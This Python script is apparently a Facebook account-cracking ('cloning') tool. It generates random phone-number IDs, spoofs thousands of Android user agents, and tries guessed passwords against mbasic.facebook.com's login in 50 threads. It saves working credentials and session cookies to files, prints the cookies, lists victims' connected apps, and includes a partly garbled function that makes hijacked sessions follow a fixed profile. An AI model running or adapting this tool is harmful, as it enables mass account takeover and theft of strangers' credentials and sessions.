import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100095198787614', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
          
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/profile.php?id=100002180082587')
logo = ("""\033[1;93m
   d88b  .d88b.  db   dD d88888b d8888b. 
   `8P' .8P  Y8. 88 ,8P' 88'     88  `8D 
    88  88    88 88,8P   88ooooo 88oobY' 
    88  88    88 88`8b   88~~~~~ 88`8b   
db. 88  `8b  d8' 88 `88. 88.     88 `88. 
Y8888P   `Y88P'  YP   YD Y88888P 88   YD\033[1;93m                 
    
 \033[1;93m═════════════════[\033[1;32m MR JOKER  \033[1;32m]══════════════
 \033[1;93m     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m 𝐌𝐃 AJ1JOKER JOKER\033[1;32m
 \033[1;93m     \033[1;32m[✓] FACEBOK      : \033[1;34m 𝐌d AJ1JOKER JOKER\033[1;32m
 \033[1;93m     \033[1;35m[✓] GITHUB       :  \033[1;35AJ1JOKERmJOKER\033[1;32m 
 \033[1;93m     \033[1;36m[✓] TOOL STATUS  : \033[1;36m LOVE JOKER\033[1;32m 
 \033[1;93m     \033[1;35m[✓] TEAM         :  \033[1;35 NOT JOKER\033[1;32m 
 \033[1;93m     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m1.0.3\033[1;32m 
 \033[1;93m᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱ \033[1;32m
 \033[1;93m  [\033[1;97m•\033[1;91m]\033[1;32m MR JOKER....                 \033[1;32m  
 \033[1;93m  [\033[1;97m•\033[1;91m]\033[1;32m AJ1JOKER TERMUX HACKER JOKER....          \033[1;32m 
 \033[1;93m════════════════════[\033[1;93AJ1JOKERm\033[1;32m]════════════════════""")
def linex():
	print('\033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
oks = []
cps = []
def clear():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/profile.php?id=100002180082587')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

ugen2=[]
ugen=[]
 
for xd in range(10000):
     aa='Mozilla/5.0 (Linux; Android'
     b=random.choice(['7','8','9','10','11','12','13','14'])
     c='M2006C3MII Build/RP1A.200720.011; ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
     d=random.randrange(40,115)
     e='0'
     f=random.randrange(3000,6000)
     g=random.randrange(20,100)
     h='Mobile Safari/537.36'
     ua=f'{aa} {b}; {c}{d}.{e}.{f}.{g} {h}'
     ugen.append(ua)
    

def AJ1JOKER(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :AJ1JOKER = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :AJ1JOKER = '√ 2009'
        elif uid[:8] in ['10000000']        :AJ1JOKER = '√ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:AJ1JOKER = '√ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:AJ1JOKER = ' 2010'
        elif uid[:6] in ['100001']          :AJ1JOKER = '√ 2010/2011'
        elif uid[:6] in ['100002','100003'] :AJ1JOKER = '√ 2011/2012'
        elif uid[:6] in ['100004']          :AJ1JOKER = '√ 2012/2013'
        elif uid[:6] in ['100005','100006'] :AJ1JOKER = '√ 2013/2014'
        elif uid[:6] in ['100007','100008'] :AJ1JOKER = '√ 2014/2015'
        elif uid[:6] in ['100009']          :AJ1JOKER = '√ 2015'
        elif uid[:5] in ['10001']           :AJ1JOKER = '√ 2015/2016'
        elif uid[:5] in ['10002']           :AJ1JOKER = '√ 2016/2017'
        elif uid[:5] in ['10003']           :AJ1JOKER = '√ 2018/2019'
        elif uid[:5] in ['10004']           :AJ1JOKER = '√ 2019/2020'
        elif uid[:5] in ['10005']           :AJ1JOKER = '√ 2020'
        elif uid[:5] in ['10006','10007','']:AJ1JOKER = '√ 2021'
        elif uid[:5] in ['10008']           :AJ1JOKER = '√ 2022'
        elif uid[:5] in ['10009']           :AJ1JOKER = '√ 2023'
        else:AJ1JOKER=''
    elif len(uid) in [9,10]:
        AJ1JOKER = ' √ 2008/2009'
    elif len(uid)==8:
        AJ1JOKER = '√ 2007/2008'
    elif len(uid)==7:
        AJ1JOKER = '√ 2006/2007'
    else:AJ1JOKER=''
    return AJ1JOKER
    
    
    
def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Example : {xr}079,077,078,93702,93701,937078{x}')
    print(" \033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××")
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    code = random.choice([rk1,rk2,rk3])                      
    pww = input(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Choose : ')
    os.system('clear')
    print(logo)
    limit = int(input(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m EXAMPLE : 10000, 20000, 50000 \n \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××× \n \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"\033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOTAL IDS: {xr}'+tl)
        print(f'{x} \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m THE PROCESS HAS BEEN STARTED')
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m WORK CUNTRY \033[1;97m: \033[1;96mBANGLADESH')
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m MD-AJ1JOKER')
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m USE NETWORK  \033[1;97m:  \033[1;96m2G, 3G, 4G, 5G ')
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;91m USE AEROPLANE MOOD IN EVERY 5 MIN ')
        print(f" \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
    'method': 'GET',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"vivo 1814"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"8.1.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[AJ1JOKER-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/AJ1JOKER-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;31m [AJ1JOKER-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/AJ1JOKER-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}AJ1JOKER {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass



xxr()
      
